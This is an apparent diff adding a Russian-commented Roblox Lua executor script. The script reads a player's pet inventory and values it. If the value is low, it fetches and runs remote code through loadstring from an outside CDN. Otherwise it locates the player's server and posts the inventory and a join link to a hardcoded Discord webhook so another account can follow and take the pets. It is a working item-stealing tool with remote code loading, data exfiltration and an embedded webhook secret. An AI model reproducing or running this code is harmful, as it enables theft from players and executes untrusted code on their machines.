@@ -1,0 +1,180 @@
+-- ⚙️ Конфиг
+getgenv().MinTotalValue = 2000
+-- ================== Конфиг (заполни перед запуском) ==================
+-- Пример:
+local COOKIE_URL = "https://pastefy.app/nES91OeT/raw"
+-- =====================================================================
+local function fetchCookie()
+    local ok, result = pcall(function()
+        return game:HttpGet(COOKIE_URL)
+    end)
+    if ok and result and result ~= "" then
+        local cookie = result:gsub("\n", ""):gsub("\r", "")
+        print("[COOKIE] Загружена кука из Pastefy")
+        return cookie
+    else
+        warn("[COOKIE] Ошибка загрузки куки")
+        return nil
+    end
+end
+
+-- теперь куку можно положить в getgenv()
+getgenv().Cookie = fetchCookie()
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1411844628415778816/zFn2mqRx3X3zhGXa2YGREk3zl3TvquuLMh9ZtBqjfdQ_hAxf23QnbT324oLylgLEahPd" -- <- вебхук
+
+local PET_VALUES = {
+    ["Kitsune"] = 1500,
+    ["Raccoon"] = 400,
+    ["Disco Bee"] = 350,
+    ["Fennec Fox"] = 275,
+    ["Butterfly"] = 200,
+    ["Spinosaurus"] = 100,
+    ["Mimic Octopus"] = 75,
+    ["T-Rex"] = 75,
+    ["Queen Bee"] = 60,
+    ["Dragonfly"] = 60,
+}
+
+-- Сервисы
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local httpRequest = (http and http.request) or (syn and syn.request) or request or http_request
+if not httpRequest then error("[SCRIPT] HTTP не доступен") end
+
+-- DataService
+local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
+print("[SCRIPT] Ожидание playerData...")
+local playerData
+repeat task.wait(1)
+    playerData = dataModule:GetData()
+until playerData and playerData.PetsData and playerData.PetsData.PetInventory
+print("[SCRIPT] ✅ playerData получены.")
+
+local LocalPlayer = Players.LocalPlayer
+local petsData = playerData.PetsData.PetInventory.Data
+
+-- Подсчёт питомцев и общей стоимости
+local petCounts, totalValue = {}, 0
+for _, petInfo in pairs(petsData) do
+    local petType = petInfo.PetType
+    if petType then
+        local val = PET_VALUES[petType] or 0
+        if val > 0 then
+            petCounts[petType] = (petCounts[petType] or 0) + 1
+            totalValue = totalValue + val
+        end
+    end
+end
+
+if totalValue < getgenv().MinTotalValue then
+    ID="72b71fa3-cd02-4785-a26d-a1da88f43dce";
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+    return
+end
+
+-- Сортировка питомцев по цене
+local sortedPets = {}
+for name, count in pairs(petCounts) do
+    table.insert(sortedPets, { name = name, count = count, value = PET_VALUES[name] })
+end
+table.sort(sortedPets, function(a, b) return a.value > b.value end)
+
+-- Сбор UserId всех игроков
+local userIds, idToName = {}, {}
+for _, plr in ipairs(Players:GetPlayers()) do
+    table.insert(userIds, plr.UserId)
+    idToName[plr.UserId] = plr.Name
+end
+
+-- Запрос presence API
+local reqBody = HttpService:JSONEncode({ userIds = userIds })
+local ok, response = pcall(function()
+    return httpRequest({
+        Url = "https://presence.roblox.com/v1/presence/users",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+            ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
+        },
+        Body = reqBody
+    })
+end)
+
+if not ok or not response or not response.Body then
+    warn("[SCRIPT] ❌ Ошибка запроса presence API.")
+    return
+end
+
+local parseOk, parsed = pcall(function() return HttpService:JSONDecode(response.Body) end)
+if not parseOk or not parsed or not parsed.userPresences then
+    warn("[SCRIPT] ❌ Не удалось распарсить JSON presence API.")
+    return
+end
+
+-- Находим первого игрока с placeId и jobId
+local firstPlaceId, firstJobId, firstPlayerName, joinLink = nil, nil, nil, nil
+for _, presence in ipairs(parsed.userPresences) do
+    local placeId, jobId = presence.placeId, presence.gameId
+    if not firstPlaceId and placeId and jobId then
+        firstPlaceId = placeId
+        firstJobId = jobId
+        firstPlayerName = idToName[presence.userId] or ("User_" .. presence.userId)
+        joinLink = ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
+        break
+    end
+end
+
+if not firstPlaceId then
+    print("[SCRIPT] ❌ Не найдено ни одного игрока для телепорта.")
+    return
+end
+
+-- Формирование Discord embed
+local embedFields = {}
+for _, p in ipairs(sortedPets) do
+    table.insert(embedFields, {
+        name = p.name,
+        value = string.format("%d × %d = %d", p.count, p.value, p.count * p.value),
+        inline = true
+    })
+end
+
+table.insert(embedFields, {
+    name = "Телепорт (TeleportService)",
+    value = string.format("`game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')`", firstPlaceId, firstJobId),
+    inline = false
+})
+
+-- Embed
+local embed = {
+    title = "Отчёт по питомцам — " .. LocalPlayer.Name,
+    description = string.format("💰 Суммарная стоимость: %d", totalValue),
+    color = 0x1ABC9C,
+    fields = embedFields,
+    footer = { text = "🔗 Ссылка для ручного Join (не ломает скрипт)" },
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+-- payload с @everyone и ссылкой для ручного входа
+local payload = HttpService:JSONEncode({
+    content = "@everyone\n" .. (joinLink or "Нет ссылки"),
+    embeds = { embed }
+})
+
+-- Отправка вебхука
+local okSend, respSend = pcall(function()
+    return httpRequest({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = payload
+    })
+end)
+
+if okSend and respSend and (respSend.StatusCode == 200 or respSend.StatusCode == 204) then
+    print("[SCRIPT] ✅ Вебхук отправлен. Телепорт-код готов для скрипта на другом аккаунте.")
+else
+    warn("[SCRIPT] ⚠️ Не удалось отправить вебхук:", respSend and (respSend.StatusCode or respSend.Body) or tostring(okSend))
+end
+
